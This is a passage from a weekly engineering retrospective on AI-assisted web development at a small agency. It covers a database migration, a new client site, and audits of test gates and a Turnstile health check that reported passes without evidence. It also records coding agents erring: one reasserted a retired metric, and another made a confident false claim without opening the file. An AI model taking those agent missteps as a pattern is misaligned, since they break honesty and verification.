# Week 06 — 2026-08-31 → 2026-09-06

**Headline:** The Airtable→Turso flip went live inside two hours of the
go-ahead and then spent the rest of the week being audited for what it had
quietly broken; meanwhile a brand-new client site was built in four days
behind an accessibility gate that was pointed at nothing, a Turnstile
"pass" turned out to be a truthiness check on an environment variable, and
a game telemetry recorder turned out to have been recording nothing — three
independent instruments, all green, all blind, all found in the same seven
days.

---

## SOURCE COVERAGE — read this before believing any narrative detail

**Transcripts are FULL for this week.** Retention begins 2026-08-10; every
day here is after that line. This is the first week of the retrospective
where I have both the transcripts _and_ a contemporaneous work journal, and
they can be cross-checked against each other.

| Source                                                   | Status for this week                                                                                                                                                                                                                                          |
| -------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `commits.jsonl`                                          | **Full.** 654 rows / 632 unique SHAs across 39 checkouts.                                                                                                                                                                                                     |
| Commit **bodies** (read with `git log` in the checkouts) | **Full and the single richest source.** Tucker's commit bodies routinely run 20–60 lines of prose with file:line citations, before/after measurements, and explicit "this is what I believed and it was wrong" paragraphs. Most numbers below come from here. |
| `prs.jsonl`                                              | **Full.** 206 opened / 222 merged (local-day window).                                                                                                                                                                                                         |
| `runs.jsonl`                                             | **Full for this week.** 817 runs (local-day), 19 failures, all `ci`.                                                                                                                                                                                          |
| `sessions.jsonl`                                         | **Present but must be read carefully** — see the caveat below.                                                                                                                                                                                                |
| `prompts.jsonl`                                          | **Present, and duplicated.** Every prompt appears roughly twice; `prompts-unique.jsonl` is the one to use.                                                                                                                                                    |
| `discord-messages.jsonl`                                 | **Present — 113 messages in-window**, across 10 channels, 4 humans. Carries the VLF budget-overage thread and Tim's Beachfront review round.                                                                                                                  |
| `docs/workJournal.md` (reddoor-maintenance)              | **Opens 2026-09-05.** Two in-window entries. Also ~38 other repos received a journal on Sep 5–6; `welcome-to-the-flower-court` and `vida-legacy-foundation` carry the richest ones.                                                                           |
| `airtable-*.json`                                        | Snapshot of 2026-09-12. Irrelevant to this week except as evidence Airtable stopped being authoritative on the 31st.                                                                                                                                          |

### Three measurement caveats that materially change the numbers

1. **Two different clocks.** `commits.jsonl` carries local timestamps
   (`-07:00`). `prompts.jsonl`, `prs.jsonl` and `runs.jsonl` carry UTC.
   Verified: the first `welcome-to-the-flower-court` prompt is stamped
   `17:57:18` and its `Initial commit` is stamped `10:54:25-07:00` — the same
   moment. **Everything in the CALENDAR below is converted to local
   (UTC−7).** A naive read of the raw `day` fields shifts every evening's
   work into the next day.

2. **"Sessions" in `sessions.jsonl` are session _files_, not sittings.**
   1,500 rows in-window, but only 113 of them contain even one user message
   — the rest are subagent and workflow transcripts. And `durMin` is a file
   span, not attention: the top row is 5,766 minutes (four days) because one
   `Broken` session was resumed repeatedly. **Prompts per day is the honest
   proxy for operator attention; session counts are not.**

3. **Prompt counts need stripping.** 834 unique prompt records fall in the
   UTC window (859 on local days). Of those, **~525 are Tucker's own typed
   words**; the remainder are `<task-notification>` blocks, compaction
   summaries, `<ide_opened_file>` wrappers, and one recurring ~6,000-character
   "Workflow authoring reference" that the harness injects. Every quote below
   is from the stripped set and is verbatim, typos included.

Everything below is (a) quoted from a transcript, commit body, or Discord
message, (b) an arithmetic aggregate over the corpus, or (c) explicitly
marked INFERRED.

---

## CALENDAR

All times local (UTC−7).

| Day       | Commits (uniq) | Repos | PRs open/merge | CI runs (fail) | Prompts (Tucker's own) | Working span  |
| --------- | -------------- | ----- | -------------- | -------------- | ---------------------- | ------------- |
| Mon 08-31 | 79 (77)        | 26    | 8 / 27         | 60 (0)         | 123                    | 11:01 → 23:27 |
| Tue 09-01 | 106 (98)       | 26    | 79 / 56        | 173 (9)        | 181                    | 08:58 → 23:04 |
| Wed 09-02 | 114 (114)      | 25    | 38 / 55        | 179 (4)        | 172                    | 09:18 → 23:35 |
| Thu 09-03 | 85 (83)        | 9     | 28 / 29        | 88 (1)         | 102                    | 00:01 → 21:28 |
| Fri 09-04 | 55 (51)        | 10    | 11 / 13        | 102 (0)        | 88                     | 10:23 → 20:07 |
| Sat 09-05 | 177 (171)      | 40    | 41 / 41        | 163 (5)        | 141                    | 10:08 → 21:45 |
| Sun 09-06 | 38 (38)        | 3     | 1 / 1          | 52 (0)         | 52                     | 09:38 → 23:39 |

Seven days, no days off. The shortest working span is Friday's 9h44m; the
longest is Wednesday's 14h17m plus a tail that runs past midnight into
Thursday (Thursday's 00:01 commit is Wednesday's session still going).

**Commits by repo (rows):** Broken 88 · vida-legacy-foundation 83 ·
welcome-to-the-flower-court 73 · reddoor-maintenance 66 · beachfront-dentistry
47 · reddoor-website 47 · reddoor-starter 23 · gallerysonder 19 · revogen 15 ·
caldea 14 · reddoor-starter-blux 14 · the-bench 14 · canvas-starter 9 ·
the-tower-burbank 9 · alamo-anatomy 8 · caltex-landing 8 · espada 8 · hedloc 8
· the-pointe-burbank 8 · vineyard-custom-homes 8 · medical-solutions-of-texas
7 · 1836dig 6 · data-dynamiq 6 · la-homelessness-initiative 6 ·
la-homelessness-youth 6 · reddoor-md-pdf 6 · reddoorla-dot-github 6 ·
scriptorium-setup 6 · erp-industrial 5 · songbook 5 · to-go 4 ·
dont-lose-your-head 3 · reddoor-rfp-analyses 3 · songbook-content 3 ·
the-pointe 3 · ulti-grid 3 · claude-skills 2 · reddoor-mailer 2 · rfp-analyze
2 · a-budget 1.

**Authorship:** 589 rows Tucker Lemos, 65 rows `reddoor-renovate[bot]`. The
bot is concentrated on Monday (34) and Wednesday (25) and is absent entirely
from Thursday onward.

**Attention split, measured.** Of 859 local-day unique prompts, **526 went
to Reddoor client/fleet repos and 333 (39%) went to personal projects** —
`Broken` (a Godot physics game, 280 prompts), `caldea` (a novel), `songbook`,
`a-budget`, `the-bench`, `scriptorium-setup`,
`welcome-to-the-flower-court`. Of 654 commits, 440 work / 214 personal
(33%). `Broken` alone drew more of Tucker's typed messages this week than
`reddoor-maintenance` and `reddoor-starter` combined.

**Skills invoked (from `sessions.jsonl`):** `superpowers:test-driven-development`
9 · `superpowers:brainstorming` 8 · `superpowers:writing-plans` 8 ·
`superpowers:systematic-debugging` 7 · `figma-slices` 7 ·
`figma:figma-design-to-code` 7 · `evening-review` 5 ·
`superpowers:subagent-driven-development` 4 · `new-site` 3 · `artifact-design` 3
· `markup-review` 1. **Zero slash commands recorded.**

**Subagents:** `general-purpose` 100 · `superpowers:code-reviewer` 24 ·
`Explore` 21 · `episodic-memory:search-conversations` 7. **72 `Workflow`
tool calls.** Tool mix is overwhelmingly shell: 33,662 `Bash` against 2,507
`Read`, 1,329 `Edit`, 391 `Write`.

**Models:** `claude-opus-5` 537 · `claude-fable-5-1` 282 ·
`claude-haiku-4-5` 158 · `claude-fable-5` 155 · `claude-opus-4-5` 139 ·
`claude-sonnet-5` 28. Tucker switched models mid-week for budget reasons and
said so out loud (below).

**Interruptions: 93**, of which **54 in vida-legacy-foundation** and 20 in
reddoor-website.

### Per-day notes

**Mon 08-31.** Six parallel sessions from the first hour (gallerysonder,
Broken, caldea, songbook, reddoor-website, reddoor-maintenance). Morning goes
to the prospect-audit tool's API spend; afternoon to clearing the Beachfront
form-E2E probe defect (#641); **the Turso flip merges at 17:45**. 34 of the
day's 79 commit rows are Renovate.

**Tue 09-01.** The heaviest PR day of the week (79 opened). The starter track
split lands at 08:58 and propagates through every site repo. `vida-legacy-foundation`
gets its `Initial commit`. Three `version packages` releases are cut between
11:59 and 13:04. Nine CI failures, seven of them Beachfront.

**Wed 09-02.** 114 commits across 25 repos, zero duplicated SHAs — the widest
genuinely-parallel day. VLF takes 34 of them; reddoor-website 22 (the report
rewrite); Beachfront 13 (Tim's MarkUp round). Tucker spends a long block
drafting client email to Gallery Sonder and corrects the agent's register
twice.

**Thu 09-03.** Repo count collapses from 25 to 9 — the day narrows onto three
things: the forms auto-reply feature (12 maintenance commits, four releases),
VLF review rounds (23 commits), and Broken (17). Only one CI failure.

**Fri 09-04.** The quietest day (55 commits, 10 repos, 0 CI failures). Entirely
the Turnstile chain in maintenance and the tape-sink rebuild in Broken. Also
the day the machine crashed: _"computer crashed because I also opened steam,
resume"_ — sent identically into four sessions at 14:50 within 39 seconds.

**Sat 09-05.** 177 commits across **40 repos** — the work-journal sweep touched
38 of them. Also: the VLF retrospective, the mutation audit,
`fleet-repos.sh`, and the entire Flower Court site built and shipped
(10:54 → 21:45).

**Sun 09-06.** Three repos. Almost all of it is Flower Court physical
production — sigil papercuts, dossier PDFs, twelve guest emails.

---

## BEATS

### 1. THE FLIP — Airtable stops being the source of truth (Mon 08-31)

Tucker opened the day's fleet thread with _"how is the state of the fleet?"_,
then gated the migration behind a specific proof: _"check on the reddoor
beachfront end 2 end, if you clear that come back to me and we'll talk about
the turso flip."_ The probe defect was root-caused and shipped as #641 before
the flip conversation started.

He then asked the right question rather than the eager one: _"let's talk flip,
anything we're going to lose by retiring airtable outside of their tooling as
stands? take your time to review this."_ The audit came back with **two real
losses**: client credentials stored on 9 Airtable site rows, and Airtable's
edit history. Both were disposed of rather than engineered around — six
credential items imported to a 1Password Personal vault and verified
byte-for-byte, all four credential fields cleared on all nine sites; and on
history, _"edit history is decent but as long as we have relatively consistent
backups that should be fine."_

Then: _"great, let's start on the flip, go for task one"_ (15:55). **The flip
merged at 17:45:46** as `dadb073` / #643, +398/−266. The go/no-go recorded in
the source comment is exact and was taken immediately before the merge:

> `FLEET_PARITY sites=44 health=44 schedule=44 reports=17 mismatches=0`

Three things about the shape of this are worth the downstream reader's
attention.

**The switch is a code constant, not an env var** — `TURSO_IS_AUTHORITATIVE`
in `src/db/freeze.ts` — _"so the freeze is uniform across Netlify functions +
Actions"_. An env var can be set in one deployment surface and not another;
a constant cannot disagree with itself.

**The hourly import retired in the same PR.** The commit body is explicit that
this was not tidiness: _"the inversion and the import stop must move together,
and do."_ `fleet-db-sync.yml` was `git rm`'d and its gate test deleted with it.

**The agent was forbidden from merging it.** From the session's own carried
summary: _"The operator merges #643 — merging it IS the freeze; I must NOT
merge it."_ Tucker merged. This is the merge-authority policy working as
designed, and it is the only PR of 222 this week that was structurally held
back from the agent.

**What the flip broke, and how quickly.** A pre-merge deep review — Tucker
asked for it: _"do one more deep review of this, if everything worked as it
should last week, and if you're missing any regressions. most sensitive area
is forms and client leads"_ — caught three regressions inside the flip commit
itself, each of them a thing the retired hourly sync had been silently
converging:

- the send batch's `Sent at` / `Resend message ID` stamps had no other
  converger, and an unmirrored stamp **silently disarms the console's
  already-sent guards**;
- `fleet-prismic-drift` and `fleet-security` build site mirrors that now
  _refuse to build_ without Turso creds — the first would have redded every
  nightly, the second was masked by `|| true` and would have **silently stopped
  dispatching Renovate**;
- `db import-airtable` / `db sync` now refuse under the freeze without
  `--force`, because a habitual import would overwrite authoritative Turso
  rows with the frozen archive.

The second of those is the one to remember: a `|| true` in a workflow step
would have turned a hard post-flip failure into an unnoticed absence of
dependency updates across the fleet.

### 2. Dev audits ride the subscription, and Tucker catches a decision being ignored (Mon 08-31)

The prospect-audit tool burns model calls. Tucker: _"went over spending
thresholds for the api, is there a way to use credits from here we've already
paid for, for these original audits where we're building the audit tool,
rather than burning cash through the api?"_ — and then, when the answer was
yes: _"can you set up our pipeline to use it for now? have an env toggle
between this and the actual API usage once we push to production."_

That became #642: `PROSPECT_LLM_AUTH=subscription` swaps both model call sites
for `claude -p` subprocesses; unset stays on the metered API, which remains the
production default. The session pinned a dozen empirical `claude -p` contracts
that are not in any doc — `--json-schema` plus a `$schema` meta key yields a
success envelope with silently **no** `structured_output`; `ANTHROPIC_API_KEY`
outranks OAuth in auth resolution and must be stripped from the child env;
`--output-format stream-json` requires `--verbose`.

**And immediately it produced an instrument problem.** The two engines do not
agree: the claude-code engine scored visibility 60/0/40/20/60/40/20 where the
API engine had put two-thirds of the same benchmark at zero. The session's own
conclusion was that rows must be stamped with `llmAuth` and engine
`"claude-code"` so they stay distinguishable, and that **one API-engine control
run is needed before any of those numbers travel**. This is the week's first
instance of the house rule applied _before_ a failure rather than after it.

Later that night, Tucker caught the agent contradicting a standing decision:

> _"didn't we say we were killing ai visibility as a score?"_

The agent had headlined AI Visibility scores in the batch results. It had been
killed as a scorecard item weeks earlier on the grounds that it is a
four-valued floor-bound metric that cannot rank prospects. Two commits the same
evening finished the job across email, PDF and CLI (#644). **The decision had
been made, written down, and still reasserted itself in output — the operator
was the only thing that caught it.**

### 3. The starter track split (Tue 09-01) — and a forward-merge instruction that was a landmine

`reddoor-starter` became native-only at 08:58 (#106: **+1,453 / −29,941 across
242 files** — the single largest PR of the week, and almost entirely deletion).
The Blux render layer moved to `reddoor-starter-blux`, a full-history snapshot.

The valuable part is what was found the same day. The Blux repo's README
carried an instruction to forward-merge from `reddoor-starter/main`. A dry run
was performed rather than the instruction trusted:

> `git merge starter/main` into this repo **stages 178 CLEAN deletions**
> (`src/lib/blux*`, every `Blux*` slice, `tests/gate`, the catalog custom
> types) because the native template removed them in #106. **Only `README.md`
> conflicts**, so following the previous instruction once would have silently
> destroyed the track this repo exists to preserve.

The routine path is now `git cherry-pick`; `merge -s ours` is documented as the
one-time architecture decision it actually was. This is a belief corrected on
contact with a dry run — cost: one dry run. Cost if it had been corrected on
contact with a real merge: the entire Blux track, with no conflict to warn
anyone.

The split rippled: `ci: take reusable workflow v1.4.1 (single smoke run)` and
`fix(images): cap Prismic srcset widths` went out to ten site repos the same
day, which is most of Tuesday's 79 opened PRs.

### 4. One gate, five names (Tue 09-01)

`#662` collapsed CI and local verification onto one definition. The motivating
measurement is in the body: _"`lint && build && test` passed locally and CI
failed on `typecheck` — the only step that typechecks `tests/**`. Nothing local
ran `test:dist` either, and `pnpm test` is not `test:coverage`, so the coverage
floor was CI-only."_

The first cut collapsed the Actions UI to a single `pnpm verify` step. Tucker
pushed back — _"merge the greens, and yes, I'd rather still see the steps"_ —
and the second cut kept the five named steps but made
`tests/ci-gate.test.ts` **derive** the expected command list from the `verify`
script and assert the workflow matches exactly, in order. So `ci.yml` is now a
_rendering_ of `verify`, not a second copy of it.

And then the instrument was proven: _"Mutation-tested the guard rather than
trusting a green: dropping `test:dist`, swapping typecheck/lint, and
downgrading verify to the fast `test` script each fail it; restoring each
returns it to green."_ That is the house rule executed correctly and on the
first try.

### 5. Gate A — making a number that survives being measured twice (Tue 09-01 → Wed 09-02)

`#667` (+2,081 / −176, 28 files) is the most conceptually interesting PR of the
week. The prospect report's "Answers" score was computed from buyer questions
**the model wrote fresh on every run** — 6 to 10 of them, different each time.
The commit body states the problem better than I can:

> _"That made a good report out of an instrument nobody could read twice: the
> denominator moved, the questions moved, and the Answers score measured a
> different thing every audit. One section above it the report promised 'every
> number here is one we can move and show you the before and after of'. That
> was not true of the number we most wanted to build a second conversation
> on."_

The fix: a fixed question set keyed on the client's stated goal — six universal
plus four per goal — with `questionSetId` stored on each audit, and _"two
audits are comparable exactly when it matches, and a null never counts as a
match."_ The reconciliation is deliberately asymmetric: a question the model
**skipped** is kept and marked `unknown` (our gap, excluded from the score,
never scored as a "no" about them); a question it **invented** is dropped
(_"nobody asked it and nobody can reproduce it"_).

The honest-accounting line is in the body too: _"The trade is real: a model
writing questions fresh can be sharper about one business than a list written
months earlier. We are buying comparability with that sharpness."_

The same PR closed the report's worst failure mode: a goal checklist printing
"Yes — a phone number they can tap" while the fix list, three sections later,
said to add one. _"To a reader that is not one finding disagreeing with
another, it is a document nobody checked, and it discredits every other line in
it."_

### 6. Airtable could still cost a lead (Wed 09-02)

Two days after the flip, Tucker asked _"do the high fix, what would have
triggered the issue? messages are still coming through right now"_ and got
`#669`.

`form-ingest` returned **500 on a missing `AIRTABLE_PAT` / `AIRTABLE_BASE_ID`,
before touching the submission** — in front of the dead-letter, which lives
inside `ingestSubmission`. `submitToIngest` does not retry, _"so a lead refused
there is gone, announced by a log line and nothing else."_

Post-flip the guarded code was unreachable, so the check guarded nothing. What
makes this the week's best-shaped latent bug:

> _"Nothing had triggered it: the check tests PRESENCE, so an expired or
> revoked PAT never trips it, and both vars are set in production today. **What
> arms it is a deletion — which is on the calendar.**"_

Phase 6 of the migration deletes those env vars. The plan already carried the
correct ordering as prose; _"what it lacked was anything that fails if the
order is not followed. Now the suite does."_ Both tests are handler-level on
purpose — _"the existing page test set `AIRTABLE_PAT` in `beforeEach`, which is
exactly what kept the dead guard invisible."_

### 7. Beachfront — a note loses to a loop (Tue 09-01 → Fri 09-04)

Tim filed a MarkUp round on Sep 1 (_"I just made some 'tightening up' comments
on the Beachfront website in MarkUp"_). Eight pins, worked through the
`markup-review` skill, landed as #38 (+3,774 / −965).

Three things from this thread are worth carrying forward.

**(a) "How can I enforce you remembering that?"** Tucker, Sep 1:
_"we're done with pixel matching for now, how can I enforce you remembering
that? we're going to do other webflow sites, so it is going to be a running
theme."_ The answer was not a note. From the commit body:

> _"The matching machinery is self-propelling by design — CLAUDE.md rule 5 is a
> loop ('after committing run next.mjs; while it exits 1 the round continues')
> and next.mjs ends with 'Round continues. Do not hand back control with work
> outstanding.' With 24 open regions it will always exit 1 and always read as
> an instruction. So the pause is an exit code, not a note. **A note loses to a
> loop**: the loop is mechanical and the note is not."_

`matching/PAUSED` is a file the tooling checks _first_, before any report is
read. The `.gitignore` detail is the part that would have silently defeated it:
`matching/*` was whitelisted **by extension** and `PAUSED` has none, so the
switch was ignored — _"an ignored switch is not a switch."_

Then it was lost anyway: the pause switch and a docs fix were **orphaned when
PR #37 was closed** and had to be re-landed as #40. One clean rework, caused by
closing a PR rather than merging it.

**(b) The eight "pre-existing" reds were the instrument finally working.** The
I3 ledger logged 8 interaction failures as pre-existing and left them. They
were neither old nor flaky:

> _"They date from the Sep 1 install of `@reddoorla/maintenance` 0.90.1, whose
> `4c79cfa` moved `reducedMotion: "reduce"` into the shared Playwright base
> under `use.contextOptions` — the place Playwright actually reads it. Every
> earlier copy sat at the top level of `use` and was dropped silently, so **this
> suite had run with motion ON since June**. The 8 reds were the first run in
> which reduced motion was genuinely in force."_

So three motion tests had been measuring the ramp when they were supposed to be
measuring the reset — for three months — and the fix to the harness surfaced
as eight new failures that a session had already filed under "ignore". The
resolution was to opt those three specs out per page with a written reason,
which is correct; the lesson is that **a config key in the wrong place fails
silently in exactly the direction that makes a suite look healthier.**

**(c) A production defect nobody had seen because live's copy was shorter.**
Tim's screenshot showed "Request" painted over "Appointment". Root cause: the
pill inherits live's `.button` with `line-height:0`, so _"a label that WRAPS
does not grow the pill — the second line lands on the first line's baseline and
the words paint on top of each other."_ Live never showed it because live's
label is "Book Appointment" (283px at 25px); the MarkUp pin had renamed it
"Request Appointment" (315px) into a 300px column. Probed in Chromium **and**
WebKit at 1024/1200/1440 — _"not a Safari thing"_ — and the counting method
mattered: _"Counting distinct line tops finds nothing, because the tops are
equal; the probe counts fragments."_

### 8. vida-legacy-foundation — a site in four days, and the gate that watched nothing (Tue 09-01 → Sat 09-05)

Tucker opened it on Sep 1 at 17:41 local: _"it happened, we have our first new
site to add to the fleet! 1) do a deep review of our structure and see if
there's anything we should change before building our site, and then 2) look
into vlf in discord and my email, let's see how much of this you can build with
this system."_

**The measured shape of the build** (from the retrospective commit, #57): _four
days, 51 commits, 49 PRs, 22 sessions_. In the corpus it shows as 83 commit
rows and 55 PRs (+23,357 / −3,802), the highest of any repo this week, and
**54 of the week's 93 interruptions**.

The commercial context is in Discord, not the repo. Erik, Sep 2:
_"We're already into overages on this site, so as efficiently as possible,
pretty please."_ Tucker, the same thread, on the donation form: _"probably the
best option is just linking out to them honestly, i can't find any api to
connect to… especially if we've already overrun this project before i even
started developing."_ The donation form shipped as external links behind a
`show_form` switch — a scope cut made for budget, implemented so it can be
reversed.

**Then, on day five, Tucker asked for the retrospective**, and this is the part
worth the downstream reader's full attention:

> _"Review these sessions, how we built this site against the figma and create a
> timeline of everything you did, and put it into one document. And then make
> recommendations on what we can change process-wise to improve for the next
> site. Also, add to the starter CLAUDE.md and all the other repos I have on
> this machine, I want every repo to maintain a workJournal, similar to the one
> that I have in smahre/Broken."_

The retrospective (#57) was written by **seven researchers taking a slice each,
with a second agent fact-checking every slice against the repo — 48
corrections returned.** The check earned itself on its first finding: the draft
said connecting Netlify to the repo needed a human, _"which was true when issue
#7 was filed at 00:08:35Z and false by 00:14:51Z, when the same session did it
over the API."_ Six minutes.

**The false green.** The headline finding is the cleanest instance of this
repo's founding rule in the whole corpus:

> _"the axe gate audited no real page of this site for four days while every
> slice PR reported 'axe 0 violations'."_

`pkg.reddoor.a11yRoutes` was absent, so the audit scanned the two dev fixtures
and **no page of the site**. The fix was _"eight strings in package.json"_. It
was correctly diagnosed on **day three** and written up as a documentation
correction — and then _"waited two more days"_ because a diagnosis written into
prose is not a tracked item. The fleet's own comment on that config key records
the prior incident: scanning only fixtures once let a critical `image-alt`
violation ship to five production pages with CI green. **The same instrument
failed the same way twice, and the second time it was diagnosed and still not
fixed for 48 hours.**

**The recurring bug shape, named.** Not one bug — a shape:

> _"a green granted on the absence of an error string rather than on evidence of
> health. /health's turnstile flag is a truthiness check on an env var;
> `rendered` meant a div the starter emits whenever that var is set. Each fix
> reintroduced the same shape one step along, and the last survived by exactly
> one error code."_

Three corrections in a row each reintroduced the defect one step further along.

**The cost of measuring late.** The Figma parity harness was built on day three,
after all 17 slices had merged, and _"immediately cost three PRs re-doing pages
already called done, plus nine on the sticky-band mechanism it should have
specified once. The two facts that drove almost all of it are invisible in a
screenshot and absent from `get_design_context`'s output, and both were
extractable from the design's own data on day one."_ Tucker had asked for
exactly this on Sep 3: _"I need you to use a more robust method of checking your
output vs the figma."_

**The mutation audit (#61) — the module at the centre of the lesson had no
test.** `pnpm test:mutate` over `src/lib`, `src/params` and the `+server.ts`
handlers, deliberately outside `verify` and CI (nine minutes; _"its output is a
reading list rather than a pass/fail"_). First run: **81.21% — 1,219 mutants,
989 killed, 191 survived, 38 never reached.** The headline was fine; the
clustering was not:

- `src/lib/turnstile.ts` scored **40 with no unit test at all** — _"the module
  whose misconfiguration buckets every real lead as spam, and the origin of the
  whole positive-evidence rule."_ Emptying the entire `onerror` handler
  survived, which _"leaks a dead `<script>` into `<head>` AND never clears the
  cached promise, so one network blip disables the widget for the life of the
  page."_
- `src/params/lang.ts` and `preview.ts` scored **0**. Replacing the lang matcher
  with `() => undefined` makes every `/es` path a 404 — silently.
- `/health`'s `export const prerender = false` flipped to `true` **survived**.
  _"The fleet polls that endpoint; prerendered it reports the CI machine's state
  forever, with `ok:true`."_
- The sitemap's `lang: "*"` blanked survived: _"the Spanish half of the site
  vanishes from the sitemap, suite fully green."_

Six files went from ~50% combined to 94.44%; turnstile.ts and both matchers to 100. _"Verified by re-running the audit against the new tests rather than by
assuming — which is the rule the audit exists to mechanise."_ 153 survivors
were **filed as issues rather than fixed** (#58, #59, #60) — the retrospective's
own rule that a code comment is not a tracker, applied immediately.

**And then the retrospective was itself audited (#63)**, which produced the
week's sharpest single finding about agents:

> _"an agent asked how the field stops coding agents making confident false
> claims reported that this repo's CLAUDE.md still carried the stale
> `a11yRoutes` paragraph. It does not — #55 removed it. **The agent reasoned
> from the retrospective text in its own prompt and never opened the file.**"_

Two of the retrospective's own beliefs were corrected in the same pass. First,
**the parity harness is a commodity** — uiMatch is open-source with a fidelity
score and CI exit codes, Fidel is $29, Uiprobe has been free since April, and
Figma has bought the leading OSS visual-diff team; _"ours is 542 lines with no
score, no threshold, no exit code."_ The recommendation to measure early stands
on its own evidence; _"'build it yourself' does not."_ Second, _"the thing we
are actually ahead on — the corrected trap corpus plus this journal, read by an
agent before it acts — got one sentence, filed under secondary."_

And recommendation #10 turned out worse than unimplemented: _"both browser
gates run `npm run vite:dev`, so the harness enforcing the other nine
contradicts it, and all 67 assertions in the new matrix inherit the problem."_

One more piece of honest accounting in that commit, about documentation
inflation: _"the review says plainly that this took it from 963 lines to 1,005,
against its own recommendation to split it. Every addition was defensible
alone. **That is how a file gets to 963.**"_

Finally, on Sep 5, uiMatch 0.4.0 was **run rather than read about** (#65):
defaults fail every real page; with `viewport=1440x860 size=pad` the nav scored
31 on ground colour and the donate page 69 _"with a 46.1% area gap that is
CORRECT (the comp draws the form we hide)"_; the only typography finding was a
font-family slug-vs-display-name mismatch with no size, line-height or position
delta — _"a pixel regression gate, not a typographic diagnosis. Not adopted."_
The same PR corrected a belief that had stood since day three: _"The trim is per
STYLE, not per family. CLAUDE.md said 'Extended is trimmed' from day three
until this afternoon."_ Measured: Pragmatica Extended 300/60 reports a 42px box
on an 81px line-height (0.700), 36→25, 18→13, 12→8, each carrying
`style.leadingTrim: "CAP_HEIGHT"`, while the 10px field label — also Extended —
is untrimmed at box = line-height = 15. _"pull-figma.mjs saw the 42px box for a
week and could not say why."_

### 9. The report rewrite, driven by long operator critiques (Wed 09-02 → Thu 09-03)

reddoor-website took 47 commits this week, nearly all on the audit report
renderer, and the driver is a small number of very long Tucker messages. They
are worth reading as a class: he does not ask for a fix, he reports what the
document _did to him as a reader_.

The 1,372-character one (Sep 2, 17:39 local), abridged:

> _"use the whole content with… kill the maxwidths you've built for the rest of
> the content, that's what the contentwidth is for and everything feels too
> compressed. use our heading styles, they're defined for a reason… the 'what
> an AI already says about you' section uses way too much vertical space… we
> spend three vertical page widths on the AI being right and using our content;
> that's a 'I checked this and it's good' not listing stuff out. You lead and
> emphasize the right thing (we're hard to disambuiguate, a real problem), but
> you give no solutions and then go into all the things that are working."_

The 1,749-character one (Sep 2, 20:18 local) contains the most substantive
correction of the week on this tool:

> _"the 'your site does not say this' is a very confusing, and in our case,
> untrue, our address is in texas and we have it on our site. I think rather
> than pulling a statement, unless it's soemthing they obviously wouldn't want
> said about them, we just show them who else the AI is citing… the 5
> statements not being judged are the actually important ones here… one
> 'Reddoor Creative shows very low business activity compared with other
> companies in its sector.' is a direct diss we don't like to see an agent
> saying about us, **that's the lever that motivates someone to try and change
> something**… our site also defintely has more than 20 pages, so I don't know
> how we're copunting but its wrong."_

Every one of those landed as a named commit the same night: `what the AI says
that is not on your site — headlines only`; `the methods no longer assert that
AI crawlers run no JavaScript`; `every failed check under Does it work becomes
a fix`; `checked-and-fine and under-the-hood move after the fixes`. He also
challenged a scoring premise directly — _"did we every actually determine that
engines need you to not have js? that's a lot of points for something base don
the vercel study from years ago"_ — and the assertion was removed from the
methods rather than defended.

The strategic frame he stated once and it stuck: _"AEO is a frame or the trojan
horse to get people to click on something and engage us to help tell their
story."_

Two structural notes. `reddoor-website` moved to a **staging → main,
merge-only** flow this week at Tucker's instruction — _"the goal going forward
(here and everywhere) is to build a system where everything goes through
staging before it gets to main, so limiting to merge is ideal"_ — which
required one 3,094-line promote PR (#160) to end a squash divergence, and
Renovate repointed at `staging`. And Tucker asked for two ideas to be filed
rather than built, which is a habit the fleet's own rules keep asking for: a
cockpit dashboard rework, and _"a 'design review' tool, we have a wealth of
notes and review data from me working with nicole tim and erik, that I think we
can find some rules that can be tested programmatically… especially if I want
to be using less intensive models."_

### 10. A client ask becomes fleet plumbing, and the release gate becomes a treadmill (Thu 09-03)

Gallery Sonder wanted custom RSVP confirmation copy. What shipped that day was
a fleet capability: `feat(forms): CMS-authored auto-replies with calendar
invites` (#681, **+2,772 / −4**), then rich text bodies and per-form-type
defaults (#682), then a bug fix (#684), then an async `buildPayload` (#686).

Tucker deliberately widened the scope and said so: _"yeah the fleet stuff is
investment in our stack, don't worry about scope any more, I'll deal with that
side of things, you just do the work. and use your own work tree for this
please, we have other stuff going on parallel to this that's unrelated."_ And
the rich-text ask carried its justification: _"could we possibly do rich text
for the body instead of plain text? I know that's harder but this is reusable
tech for the whole fleet."_

**The friction is in the release cadence.** Seven `chore(release): version
packages` PRs merged this week (#658, #661, #663, #678, #683, #687, #692) —
human-merge-only by policy. Three of them on Tuesday within 65 minutes; four on
Thursday evening. Each one required Tucker to stop what he was doing, publish,
and tell the agent: _"just released the changeset"_, _"published the release,
send me that email"_, _"merged, waiting on changeset to merge, then will merge
the email stich"_, _"just merged the release"_, _"landed?"_. On Friday morning
the agent shipped `ci(release): add a workflow_dispatch trigger` (#688) —
a small automation bought with a full evening of manual round-trips.

### 11. Turnstile — four PRs, and the correction needed correcting (Fri 09-04)

This is the week's densest instrument episode, and unlike the others it is
fully self-documented in four consecutive commit bodies.

**#691 — the verdict was a truthiness check.** `Turnstile widget` in the
Websites table was written from `/health`'s `forms.turnstile`, which is
`!!PUBLIC_TURNSTILE_SITE_KEY?.trim()` — _"a truthiness check on a string that
never contacts Cloudflare."_ Deploying with the sitekey of a widget already at
Cloudflare's 10-hostname cap therefore reported **pass** while the live widget
threw 110200 and minted no token. Under `Require Turnstile` **that buckets 100%
of real leads** — and _"the false pass satisfied BOTH halves of the guardrail
meant to catch it (the red digest item needs 'fail', the amber cockpit watch
needs !== 'pass')."_

The fix is asymmetric and is the generalisable idea: **false → "fail"** (no key
IS proof the widget can't work); **true → null** (a key is NOT proof that it
does). The same PR found the failure hiding in two more places — the generated
smoke suite allowlisted `/turnstile|challenges\.cloudflare/i` against
`pageerror` as well as console output, _"so the uncaught TurnstileError was
discarded by name."_

**#693 — the runbook written that morning would have condemned a working
widget.** Two claims in step 5 were contradicted by measurement taken the same
day: _"'.cf-turnstile has an iframe child' — the fleet's widgets are invisible
mode and solve without leaving one. The healthy VLF widget was measured with
ZERO iframes and a valid 773-character token in the same instant. Following the
old text, an operator condemns a working widget."_ And the claim that form-e2e
was the automated version of that check was, at the time, believed false
because Cloudflare answers a driven browser with 600010 _"whatever the
configuration"_ — measured across three harnesses.

**#694 — and #693 was itself wrong, in the dangerous direction.** Written the
same day, corrected the same day:

> _"'form-e2e swaps in Cloudflare's always-pass test sitekey' is FALSE.
> `CF_TEST_SITEKEY` reaches exactly one expression… injected as the VALUE of a
